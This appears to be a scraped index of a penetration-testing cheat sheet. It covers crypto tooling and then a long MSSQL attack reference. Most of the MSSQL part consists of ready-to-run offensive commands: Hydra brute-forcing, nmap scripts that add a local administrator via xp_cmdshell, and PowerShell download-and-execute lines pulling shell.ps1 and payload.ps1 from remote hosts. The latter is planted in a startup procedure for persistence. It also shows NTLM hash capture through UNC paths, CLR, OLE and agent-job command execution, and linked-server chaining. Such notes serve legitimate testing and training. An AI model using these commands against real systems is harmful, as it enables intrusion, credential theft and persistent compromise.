Protect Your Admin Console MD5 collisions of any pair of PDFs: https://twitter.com/angealbertini/status/1075417521799528448 raccoon: https://raccoon-attack.com/ all leading zero bytes in the premaster secret are stripped before used in further computations Since the resulting premaster secret is used as an input into the key derivation function, which is based on hash functions with different timing profiles, precise timing measurements may enable an attacker to construct an oracle from a TLS server","title":"Crypto"},{"location":"crypto/#tools","text":"Compare unknown cipher against ACA cipher types: http://web.archive.org/web/20120624074941/http://home.comcast.net/~acabion/refscore.html Crypto Operations: http://rumkin.com/tools/cipher/ RsaCtfTool: https://github.com/Ganapati/RsaCtfTool RsaCtfTool.py --publickey public-key.pub --uncipher cipher-text.crypt One time pad decipher: https://www.braingle.com/brainteasers/codes/onetimepad.php#form Ceasar Cipher: https://www.xarg.org/tools/caesar-cipher/ Ceaser Decode: echo string | tr [A-Za-z] [N-ZA-Mn-za-m] Vigenere Cipher: https://www.dcode.fr/vigenere-cipher Elliptic Curve Cryptography for Python: https://pypi.org/project/seccure/ SSL Config Generator: https://ssl-config.mozilla.org/","title":"Tools"},{"location":"crypto/#padbuster","text":"Padding Oracle Attack https://github.com/GDSSecurity/PadBuster https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html Decrypt: padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth = 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 Encrypt padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth = 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 -plaintext user = admin","title":"PadBuster"},{"location":"crypto/#openssl","text":"","title":"OpenSSL"},{"location":"crypto/#general","text":"Create key pair: openssl genrsa - out keypair . pem 2048 Extracting public key from rsa context: openssl rsa - in keypair . pem - pubout - out publickey . crt Convert public key to PKCS#8: openssl pkcs8 - topk8 - inform PEM - outform PEM - nocrypt - in keypair . pem - out pkcs8 . key Retrieve exponent and modulus values: openssl rsa - pubin - in publickey . crt - text - noout Extracting Public Key - Using private key: openssl pkey - in example . key - pubout Extracting Public Key - From certificate: openssl x509 - in example . crt - pubkey - noout","title":"General"},{"location":"crypto/#csr-and-signing","text":"Create CSR and private key openssl req -new -newkey rsa:2048 -nodes -keyout example.key -out example.csr #OR openssl genrsa -out example.key 2048 openssl req -new -key example.key -out example.csr Check CSR openssl req -verify -in example.csr -text -noout Sign CSR enforcing SHA256 openssl x509 -req -days 360 -in example.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out example.crt -sha256 Self-sign openssl x509 -req -days 365 -in example.csr -signkey example.key -out example.crt CA-sign openssl x509 -req -in example.csr -CA ca.crt -CAkey ca.key -set_serial 9999 -extensions client -days 9999 -outform PEM -out example.crt Create P12 openssl pkcs12 -export -clcerts -in server.crt -inkey server.key -out cert.p12","title":"CSR and Signing"},{"location":"crypto/#encodingdecoding","text":"IP to Decimal: https://www.browserling.com/tools/ip-to-dec Binary to ASCII: echo 010000 | perl -lpe $_=pack B* ,$_ Ook and Brainfuck https://www.splitbrain.org/_static/ook/ https://www.splitbrain.org/services/ook https://github.com/splitbrain/ook Base64 Decode: base64 -d NmQy echo NmQy | base64 -d Base64 Encode: base64 NmQy echo NmQy | base64","title":"Encoding/Decoding"},{"location":"crypto/#hashes","text":"https://hashkiller.co.uk","title":"Hashes"},{"location":"crypto/#concurrency","text":"Multi-threaded CPU miner: https://github.com/hyc/cpuminer-multi","title":"Concurrency"},{"location":"crypto/#references","text":"How to create a self-signed SSL Certificate How to Set Up Mutual TLS Authentication to Protect Your Admin Console MD5 collisions of any pair of PDFs: https://twitter.com/angealbertini/status/1075417521799528448 raccoon: https://raccoon-attack.com/ all leading zero bytes in the premaster secret are stripped before used in further computations Since the resulting premaster secret is used as an input into the key derivation function, which is based on hash functions with different timing profiles, precise timing measurements may enable an attacker to construct an oracle from a TLS server","title":"References"},{"location":"databases-sqlserver/","text":"Databases - SqlServer Quick Reference mssql-sql-injection-cheat-sheet: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet SQL Server UNC Path Injection Cheatsheet: https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e Brute-forcing: hydra - l sa \u2013 P / path / to / rockyou . txt 10 . 10 . 10 . 125 mssql Nmap Enumeration: nmap \u2013script ms-sql and not ms-sql-brute \u2013script-args=mssql.username=sa,mssql.password=password,ms-sql-config.showall=true,ms-sql-tables.maxdb=0,ms-sql-tables.maxtables=0,ms-sql-xp-cmdshell.cmd=ipconfig /all -d -oN mssql.nmap -Pn -v -sV \u2013version-intensity 9 -T2 -p T:27900,U:1434 10 .33.1.33 nmap -sV -T2 -Pn -n -sS \u2013script = ms-sql-xp-cmdshell.nse -p1433 \u2013script-args mssql.username = sa,mssql.password = poiuytrewq,ms-sql-xp-cmdshell.cmd = net user walter P@ssWORD1234 /add 10 .33.1.33 nmap -sV -T2 -Pn -n -sS \u2013script = ms-sql-xp-cmdshell.nse -p1433 \u2013script-args mssql.username = sa,mssql.password = poiuytrewq,ms-sql-xp-cmdshell.cmd = net localgroup administrators walter /add 10 .33.1.33 nmap -v -sV \u2013version-intensity 9 -T2 -p T:27900,U:1433 \u2013script ms-sql-query \u2013script-args mssql.username = sa,mssql.password = password,mssql.database = bankdb,ms-sql-query.query = SELECT * FROM tblCustomers 10 .33.1.33 nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port = 1433 ,mssql.username = sa,mssql.password = ,mssql.instance-name = MSSQLSERVER $ip Capture hash: Run responder and do: xp_dirtree \\\\10.10.14.8\\test List all databases EXEC sp_databases ; select * from sysobjects where xtype = U ; Connect from Linux: sqsh - S someserver - U sa - P poiuytrewq - D bankdb Special Schemas: INFORMATION_SCHEMA sys DB Structure: SELECT name FROM master . dbo . sysdatabases SELECT * FROM orcharddb . INFORMATION_SCHEMA . SELECT * FROM orcharddb . INFORMATION_SCHEMA . COLUMNS SQL Injection Tips: Commenting: -- Important functions xp_dirtree - undocumented MSSQL stored procedure that allows for interaction with local and remote filesystems +EXEC+master.sys.xp_dirtree+ \\\\ 10 . 10 . 14 . 9 \\ share -- Time based injection if (select user) = sa waitfor delay 0 : 0 : 5 -- if (select user) != sa waitfor delay 0 : 0 : 5 -- Tools SQSH Accessing and Hacking MSSQL from Backtrack Linux Installation: apt - get install sqsh freetds - bin freetds - common freetds - dev Edit / etc / freetds / freetds . conf , and append: [MyServer] host = 192.168.1.10 port = 1433 tds version = 8.0 Optionally edit ~/ . sqshrc : \\ set username = sa \\ set password = password \\ set style = vert Run: sqsh - S MyServer sqsh - S { system name / IP } : { port num } - U { username } - P { password } List of available databases with: SELECT name FROM master .. sysdatabases go Build from source: $export SYBASE = /usr/local/freetds $ ./configure $ make $ su # make install # ls -l /usr/local/bin/sqsh # ls -l /usr/local/bin/sqsh.bin Roles and Permissions Principals Principals are entities that can request SQL Server resources. SQL Server-level principals: SQL Server authentication Login sa Created when instance is installed Default database is master Member of sysadmin database role public Every login belongs to the this role Windows authentication login for a Windows user Windows authentication login for a Windows group Azure Active Directory authentication login for a AD user Azure Active Directory authentication login for a AD group Server Role Database-level principals: Database User (There are 11 types of users. For more information, see CREATE USER.) dbo Created for each database Has all permissions in the database Owns dbo schema ( dbo schema is the default schema for all users, and cannot be dropped) guest Permissions granted are inherited by users who have access to the database, but who do not have a user account in the database. Cannot be dropped Can be disabled by revoking it's CONNECT permission ( REVOKE CONNECT FROM GUEST ; ) Database Role Application Role Server-Level Roles and Permissions Fixed Roles sysadmin - Can perform any activity in the server. serveradmin - Can change server-wide configuration options and shut down the server. securityadmin Manage logins and their properties. Can GRANT, DENY, and REVOKE server-level permissions. Can also GRANT, DENY, and REVOKE database-level permissions if they have access to a database. Can reset passwords for SQL Server logins. Should be treated as equivalent to the sysadmin role. processadmin - Can end processes that are running in an instance of SQL Server. setupadmin - Can add and remove linked servers by using Transact-SQL statements (sysadmin membership is needed when using Management Studio.) bulkadmin - Can run the BULK INSERT statement. diskadmin - Used for managing disk files. dbcreator - Can create, alter, drop, and restore any database. public Every SQL Server login belongs to the public server role. When a server principal has not been granted or denied specific permissions on a securable object, the user inherits the permissions granted to public on that object. Only assign public permissions on any object when you want the object to be available to all users. You cannot change membership in public. Public is implemented differently than other roles, and permissions can be granted, denied, or revoked from the public fixed server roles. Fixed Roles and Permissions https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017 Working with Server-Level Roles https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017#working-with-server-level-roles Database Level Roles and Permissions CREATE LOGIN ... WITH PASSWORD = ...; Fixed Roles db_owner Can perform all configuration and maintenance activities on the database. Can drop the database in SQL Server. (In SQL Database and SQL Data Warehouse, some maintenance activities require server-level permissions and cannot be performed by db_owners) db_securityadmin Can modify role membership and manage permissions. Adding principals to this role could enable unintended privilege escalation. db_accessadmin Can add or remove access to the database for Windows logins, Windows groups, and SQL Server logins. db_backupoperator - Can back up the database. db_ddladmin - Can run any Data Definition Language (DDL) command. db_datawriter - Can add, delete, or change data in all user tables. db_datareader - Can read all data from all user tables. db_denydatawriter - Cannot add, modify, or delete any data in the user tables within a database. db_denydatareader - Cannot read any data in the user tables within a database. Fixed Roles and Permissions https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017 Special Roles for SQL Database and SQL Data Warehouse Exist only in the virtual master database. Permissions are restricted to actions performed in master. Only database users in master can be added to these roles. Logins cannot be added to these roles, but users can be created based on logins and then those users can be added to the roles. Contained database users in master, can also be added to these roles. dbmanager Can create and delete databases. A member of the dbmanager role that creates a database, becomes the owner of that databasee which allows that user to connect to that database as the dbo user. The dbo user has all database permissions in the database. Members of the dbmanager role do not necessarily have permission to access databases that they do not own. loginmanager - Can create and delete logins in the virtual master database. Special Roles for msdb Database db_ssisadmin db_ssisoperator db_ssisltduser Can administer and use SSIS. Instances of SQL Server that are upgraded from an earlier version might contain an older version of the role that was named using Data Transformation Services (DTS) instead of SSIS. db_ssisadmin - may be able to elevate their privileges to sysadmin [1] dc_admin dc_operator dc_proxy - Can administer and use the data collector. dc_admin may be able to elevate their privileges to sysadmin . [1] PolicyAdministratorRole Can perform all configuration and maintenance activities on Policy-Based Management policies and conditions. ServerGroupAdministratorRole ServerGroupReaderRole - Can administer and use registered server groups. dbm_monitor Created in the msdb database when the first database is registered in Database Mirroring Monitor . Has no members until a system administrator assigns users to the role. [1] These roles can modify Integration Services packages and Integration Services packages can be executed by SQL Server using the sysadmin security context of SQL Server Agent. To guard against this elevation of privilege when running maintenance plans, data collection sets, and other Integration Services packages, configure SQL Server Agent jobs that run packages to use a proxy account with limited privileges or only add sysadmin members to the db_ssisadmin and dc_admin roles. https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#msdb-roles Special Roles for R Services rpkgs - users - Allows using any shared packages that were installed by members of the rpkgs-shared role. rpkgs - private Provides access to shared packages with the same permissions as the rpkgs-users role. Members of this role can also install, remove and use privately scoped packages. rpkgs - shared Provides the same permissions as the rpkgs-private role. Users who are members of this role can also install or remove shared packages. Working with Database-Level Roles https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#working-with-database-level-roles Application Roles Enable access to specific data to only those users who connect through a particular application. Enabled by using sp_setapprole Enumeration Direct Access SQLPS module SQL Server Management Modules (SMO) .NET (System.Data.SQL / System.Data.SQLClient) Modules PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL Discovery PowerUpSQL: Get - SQLInstanceScanUDP - ComputerName 192 . 168 . 1 . 2 - verbose .NET (UDP Broadcast): [ System . Data . Sql . SqlDataSourceEnumeration ]:: Instance . GetDataSources () Local Enumeration http://www.powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/ Import-Module -Name SQLPS Get-ChildItem SQLSERVER : \\ SQL \\ machinename Get-Service -Name MSSQL * sqlinstances = Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server foreach ( $SQLInstance in $SQLInstances ) { foreach ( $s in $SQLInstance . InstalledInstances ) { [PSCustomObject] @{ PSComputerName = $SQLInstance . PSComputerName InstanceName = $s }}} Get-SQLInstanceLocal Domain Enumeration Search AD user attribute: servicePrincipalName = MSSQL * Import-Module -Name PowerUpSQL Get-SQLInstanceDomain -verbose Looking for interesting databases Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance -verbose | select -ExpandProperty DatabaseName Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance | Where-Object { $_ . is_encrypted -eq \u201c True } Get-SQLColumnSampleDataThreaded -Threads 10 -Keywords password, credit -SampleSize 5 -ValidateCC -NoDefaults -Username sa -Password pw -Instance instance -Verbose Queries Version: SELECT @@version Current User: SELECT SUSER_SNAME () SELECT SYSTEM_USER Current Role: SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT user Current Database: SELECT db_name () List All Databases: SELECT name FROM master .. sysdatabases List All Logins: SELECT - FROM sys . server_principals WHERE type_desc != SERVER_ROLE List All Users for Database: SELECT - FROM sys . database_principals WHERE type_desc != DATABASE_ROLE List All Sysadmins: SELECT name , type_desc , is_disabled FROM sys . server_principals WHERE IS_SRVROLEMEMBER ( sysadmin , name ) = 1 List All Roles: SELECT DP1 . name AS DatabaseRoleName , isnull ( DP2 . name , No members ) AS DatabaseUserName FROM sys . database_role_members AS DRM RIGHT OUTER JOIN sys . database_principals AS DP1 ON DRM . role_principal_id = DP1 . principal_id LEFT OUTER JOIN sys . database_principals AS DP2 ON DRM . member_principal_id = DP2 . principal_id WHERE DP1 . type = R ORDER BY DP1 . name ; Effective Permissions for Server: SELECT - FROM fn_my_permissions ( NULL , SERVER ); Effective Permissions for Database: SELECT - FROM fn_my_permissions ( NULL , DATABASE ); Active User Tokens: SELECT - FROM sys . user_token Active Login Tokens: SELECT - FROM sys . login_token Impersonatable Accounts: SELECT distinct b . name FROM sys . server_permissions a INNER JOIN sys . server_principals b ON a . grantor_principal_id = b . principal_id WHERE a . permission_name = IMPERSONATE Find Trustworthy Databases: SELECT name as database_name , SUSER_NAME ( owner_sid ) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys . databases https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql Brute-forcing Check if current domain user has access to DB Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Check if another domain user has access to DB runas / noprofile / netonly / user : domain \\ username powershell . exe Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Fuzzing logins: Get-SQLFuzzServerLogin -Instance ops-mssql \u2013 Verbose -- Above is equivalent to: SELECT SUER_NAME ( 1 ) SELECT SUER_NAME ( 2 ) SELECT SUER_NAME ( 3 ) BruteForce: Get-SQLInstanceDomain | G ) et-SQLConnectionTestThreaded -Username sa -Password Password -Verbose $comps = $( Get-SQLInstanceDomain ). ComputerName comps | Invoke-BruteForce -UserList C : \\ dict \\ users . txt -PasswordList C : \\ dict \\ passwords . txt -Service SQL \u2013 Verbose Command Execution xp_cmdshell Disabled by default since SQL Server 2005 Executed with the privileges of SQL Server service account Synchronous sysadmin privileges are required If uninstalled: sp_addextendedproc xp_cmdshell , xplog70.dll Execute command: EXEC master .. xp_cmdshell whoami xp_cmdshell powershell iex ( New - Object System . Net . WebClient ). DownloadString ( \\ http://10.10.14.8/shell.ps1\\ ) Enable xp_cmdshell: mssqlclient . py has enable_xp_cmdshell exec sp_configure show advanced options , 1 RECONFIGURE exec sp_configure xp_cmdshell , 1 RECONFIGURE Disable xp_cmdshell exec sp_configure show advanced options , 1 RECONFIGURE exec sp_configure xp_cmdshell , 0 RECONFIGURE Grant permissions to xp_cmdshell - Let's say we have a user that is not a sysadmin, but is a user of the master database and we nt to grant access to run xp_cmdshell: -- add user test to the master database USE [ master ] GO CREATE USER [ test ] FOR LOGIN [ test ] GO -- grant execute access to xp_cmdshell GRANT EXEC ON xp_cmdshell TO [ test ] Nishang: Execute - Command - MSSQL - ComputerName instance - UserName sa - Password pw PowerUpSQL: Invoke - SQLOSCmd - Username sa - Password pw - Instance instance - Command whoami Custom Extended Stored Procedures DLL which acts as an extension to SQL server sysadmin privileges are required to register Executes with the privileges of the service account DLL can have any file extension Can also be loaded from UNC path or Webdav Sample DLL Code: https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure If xp_calc . dll has a function called xp_calc :\\ sp_addextendedproc xp_calc , C:\\mydll\\xp_calc.dll EXEC xp_calc sp_dropextendedproc xp_calc Create-SQLFileXpDll -OutFile C : \\ fileserver \\ xp_calc . dll -Command calc.exe -ExportName xp_calc Get-SQLQuery -UserName sa -Password pw -Instance instance -Query sp_addextendedproc xp_calc , \\\\192.168.15.2\\fileserver\\xp_calc.dll Get-SQLQuery -UserName sa -Password Password1 -Instance instance -Query EXEC xp_calc Listing existing Custom Extended Stored Procedures: Get-SQLStoredProcedureXP -Instance instance -Verbose Custom CLR Assemblies CLR ( Common Language Runtime ) is a run-time environment provided by the .NET framework SQL Server CLR integration allows writing stored procedures and other things by importing a DLL. CLR integration is off by default sysadmin privileges are required by-default. Create assembly, alter assembly or DDL_Admin role can also use it. Execution takes place with privileges of the service account DLL can be loaded from a local path or a UNC path References https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv https://blog.netspi.com/attacking-sql-server-clr-assemblies/ Enable CLR: use msdb GO -- Enable show advanced options on the server sp_configure show advanced options , 1 RECONFIGURE GO -- Enable clr on the server sp_configure clr enabled , 1 RECONFIGURE GO Create DLL: C : \\ Windows \\ Microsoft . NET \\ Framework64 \\ v4 . 0 . 30319 \\ csc . exe / target : library C : \\ Users \\ labuser \\ Desktop \\ cmd_exec . cs Create-SQLFileCLRDll -ProcedureName runcmd -OutFile runcmd -OutDir C : \\ Users \\ labuser \\ Desktop Import the assembly from file: CREATE ASSEMBLY my_assembly FROM \\\\192.168.15.2\\fileserver\\cmd_exec.dll WITH PERMISSION_SET = UNSAFE ; GO Import the assembly from string: CREATE ASSEMBLY [ NMfsa ] AUTHORIZATION [ dbo ] FROM 0 x4D5A90 ...... Link the assembly to a stored procedure CREATE PROCEDURE [ dbo ].[ cmd_exec ] @ execCommand NVARCHAR ( 4000 ) AS EXTERNAL NAME [ my_assembly ].[ StoredProcedures ].[ cmd_exec ]; GO Execution: cmd_exec whoami Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Cleanup: DROP PROCEDURE cmd_exec DROP ASSEMBLY my_assembly List all CLR assemblies: Get-SQLStoredProcedureCLR -Instance instance -Verbose OLE Automation Procedure Disabled by default sysadmin privileges are required by-default. Execution takes place with privileges of the service account Execute privileges on sp_OACreate and sp_OAMethod can also be used for execution. References: https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option Enabling: sp_configure show advanced options , 1 ; GO RECONFIGURE ; GO sp_configure Ole Automation Procedures , 1 ; GO RECONFIGURE ; GO Execute: DECLARE @ output INT DECLARE @ ProgramToRun VARCHAR ( 255 ) SET @ ProgramToRun = Run( calc.exe ) EXEC sp_oacreate wScript.Shell , @ output out EXEC sp_oamethod @ output , @ ProgramToRun EXEC sp_oadestroy @ output Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Example: Sets SecurityDescriptor of ftp.exe to everyone: https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/ -- Declare variables used to reference the objects DECLARE @ objLocator int , @ objWmi int , @ objPermiss int , @ objFull int ; -- Create a WbemScripting.SWbemLocator object EXEC sp_OACreate WbemScripting.SWbemLocator , @ objLocator OUTPUT ; -- Use the SWbemLocator object s ConnectServer() method to connect to the -- local WMI server. The connection will be to the root\\cimv2 namespace EXEC sp_OAMethod @ objLocator , ConnectServer , @ objWmi OUTPUT , . , root\\cimv2 ; -- Retrieve an SWbemObject that represents the requested object -- In this case, a Win32_LogicalFileSecuritySetting object for ftp.exe EXEC sp_OAMethod @ objWmi , Get , @ objPermiss OUTPUT , Win32_LogicalFileSecuritySetting.Path= ftp.exe ; -- Create an empty SecurityDescriptor EXEC sp_OAMethod @ objWmi , Get , @ objFull OUTPUT , Win32_SecurityDescriptor ; -- Set the SecurityDescriptor s ControlFlags property to -- 4 (SE_DACL_PRESENT) EXEC sp_OASetProperty @ objFull , ControlFlags , 4 ; -- Set the file security setting object s security descriptor to the new -- SecurityDescriptor object EXEC sp_OAMethod @ objPermiss , SetSecurityDescriptor , NULL , @ objFull ; Agent Jobs (CmdExec, PowerShell, ActiveX etc.) Job can be scheduled, executed in response to alerts or by using sp_start_job stored procedure Needs sysadmin role to create a job. Non-sysadmin users with the SQLAgentUserRole , SQLAgentReaderRole , and SQLAgentOperatorRole fixed database roles in the msdb database can also be used. The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured. References: https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent https://serverfault.com/a/14569 https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution Steps xp_startservice - Start the SQL Server Agent service sp_add_job - Create Job sp_add_jobstep - Add job step sp_start_job - Run Job sp_delete_job - Delete Job Listing all Jobs** SELECT job . job_id , notify_level_email , name , enabled , description , step_name , command , server , database_name FROM msdb . dbo . sysjobs job INNER JOIN msdb . dbo . sysjobsteps steps ON job . job_id = steps . job_id Interesting subsystems (job types): PowerShell USE msdb EXEC dbo . sp_add_job @ job_name = N PSJob EXEC sp_add_jobstep @ job_name = N PSJob , @ step_name = N test_powershell_name1 , @ subsystem = N PowerShell , @ command = N powershell.exe -noexit ps , @ retry_attempts = 1 , @ retry_interval = 5 EXEC dbo . sp_add_jobserver @ job_name = N PSJob EXEC dbo . sp_start_job N PSJob -- EXEC dbo.sp_delete_job @job_name = N PSJob CmdExec USE msdb EXEC dbo . sp_add_job @ job_name = N cmdjob EXEC sp_add_jobstep @ job_name = N cmdjob , @ step_name = N test_cmd_name1 , @ subsystem = N cmdexec , @ command = N cmd.exe /k calc , @ retry_attempts = 1 , @ retry_interval = 5 EXEC dbo . sp_add_jobserver @ job_name = N cmdjob EXEC dbo . sp_start_job N cmdjob ; -- EXEC dbo.sp_delete_job @job_name = N cmdJob Microsoft ActiveX Script (VBScript and Jscript) SSIS (SQL Server Integrated Services) PowerUpSQL Invoke-SQLOSCmdAgentJob \u2013 Subsystem PowerShell -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose -Subsystem CmdExec -ubsystem VBScript -Subsystem Jscript Get-SQLAgentJob -Instance instance -username sa -Password pw -Verboe ] se External Scripting R introduced in SQL Server 2016 Python introduced in SQL Server 2017 Runtime environments must be installed as a prerequisite. Not on by default. Needs SQL server service restart. Needs sysadmin privileges to be enabled and executed. Runs with privileges of a dynamically created Windows user account (member of the SQLRUserGroup ). References: https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5 https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server Executing commands with R: sp_configure external scripts enabled GO EXEC sp_execute_external_script @ language = N R , @ script = N OutputDataSet - data.frame(system( cmd.exe /c dir ,intern=T)) WITH RESULT SETS (([ cmd_out ] text )); GO Grab Net-NTLM hashes with R: @ script = N .libPaths( \\\\\\\\testhost\\\\foo\\\\bar );library( 0mgh4x ) Using shell instead of system: https://pastebin.com/zBDnzELT @ script = N OutputDataSet - data.frame(shell( dir ,intern=T)) Executing commands with Python: EXEC sp_execute_external_script @ language = N Python , @ script = N import subprocess p = subprocess.Popen( cmd.exe /c whoami , stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), utf-8 )]) WITH RESULT SETS (([ cmd_out ] nvarchar ( max ))) PowerUpSQL: Invoke-SQLOSCmdR -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose Invoke-SQLOSCmdPython -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose Registry Autoruns File Autoruns Privilege Escalation Find Impersonatable Accounts https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/ SELECT distinct b . name FROM sys . server_permissions a INNER JOIN sys . server_principals b ON a . grantor_principal_id = b . principal_id WHERE a . permission_name = IMPERSONATE Invoke-SQLAuditPrivImpersonateLogin -Username un -Password pw -Instance dbname -Verbose Execute As https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql EXECUTE AS LOGIN = dbadmin SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) EXECUTE AS LOGIN = dbadmin SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT ORIGINAL_LOGIN () EXECUTE AS LOGIN = sa SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT ORIGINAL_LOGIN () Trustworthy Databases https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/ is_trustworthy_off by default (Only a sysadmin can change). When off impersonated users will only have database-scope permissions. When on impersonated users can perform actions with server level permissions. Allows writing procedures that can execute code with server level permission. If is_trustworthy_on and if a sysadmin (not necessarily sa ) is owner of the database, it is possible for the database owner (a user with db_owner ) to elevate privileges to sysadmin . Discover Trustworthy Databases SELECT name as database_name , SUSER_NAME ( owner_sid ) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys . databases Invoke-SQLAudit -Instance instance-name -Verbose | Out-GridView Invoke-SQLAuditPrivTrustworthy -Instance instance-name -Verbose Exploitation Add sysadmin to myuser : EXECUTE AS USER = dbo SELECT system_user EXEC sp_addsrvrolemember example.com\\myuser , sysadmin Public to Service Account UNC Path Injection Capture Net-NTLM (also known as NTLMv1/v2) hashes Stored procedures like xp_dirtree and xp_fileexist can be used to capture Net-NTLM hashes UNC Path Injection cheatsheet: https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e Invoke-SQLUncPathInjection -Verbose -CaptureIp 192 . 168 . 1 . 11 Service Account to System Rotten Potato https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ Trick the \"NT AUTHORITY\\SYSTEM\" account into authenticating via NTLM to a TCP endpoint attacker control. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the \u201cNT AUTHORITY\\SYSTEM\u201d account Impersonate the token we have just negotiated. Usable only if attackers current account has the privilege to impersonate security tokens. Extracting service account credentials from LSA Secrets and/or memory Token Impersonation for the SQL Server service Single user mode Lateral Movement Domain User accounts SQL server allows Domain user logins (it a part of the domain trust) Once domain user access is present, enumerate privileges it has on SQL servers in the domain After gaining shell access to the user (command execution) following can be done: Check if current user has access to SQL Servers in domain: Get - SQLInstanceDomain | Get - SQLServerInfo - Verbose For alternative credentials: runas / noprofile / netonly / user : domain \\ username powershell . exe A user with public access can be used to enumerate domain accounts and groups in the forest and other trusted forests: Get - SQLFuzzDomainAccount - Instance instance - StartId 500 - EndId 2000 - Verbose If local admin rights are present, dump credentials. References: https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/ Database Links Allows a SQL Server to access external data sources (SQL Servers, OLE DB) If SQL Servers are linked: Can execute stored procedures Work across SQL server versions and forests References: https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html Search for linked databases: select - from master .. sysservers Get - SQLServerLink - Instance instance - Verbose Run queries on linked databases: select - from openquery ( instance , select - frommaster..sysservers ) Run queries on chain of linked databases: select - from openquery ( inatance1 , select - from openquery( instance2 , select - from master..sysservers ) ) Get-SQLServerLinkCrawl -Instance instance1 -Verbose If rpcout is enabled for all links (disabled by default), xp_cmdshell can be enabled using: EXECUTE ( sp_configure xp_cmdshell ,1;reconfigure; ) AT instance2 ) Command execution with linked databases: select - from openquery ( instance1 , select - from openquery( instance2 , select - from openquery( instance3 , select @@version as version;exec master..xp_cmdshell cmd /c calc.exe ) ) ) Get-SQLServerLinkCrawl -Instance instance1 -Query exec master..xp_cmdshell cmd /c calc.exe -Verbose Decrypting Database Link Server Passwords: https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/ Persistence Startup stored procedures sysadmin privileges are required to mark proc for automated execution Owned only by sa Must be in the master database Cannot have input or output parameters Gets executed with sysadmin privileges Executed when SQL Server restart References: https://technet.microsoft.com/en-us/library/ms191129(v=sql.105).aspx https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/ Create: USE master GO CREATE PROCEDURE sp_autops AS EXEC master .. xp_cmdshell powershell -C iex (new-object System.Net.WebClient).DownloadString( http://webserver/payload.ps1 ) GO EXEC sp_procoption @ ProcName = sp_autops , @ OptionName = startup , @ OptionValue = on ; List: SELECT [ name ] FROM sysobjects WHERE type = P AND OBJECTPROPERTY 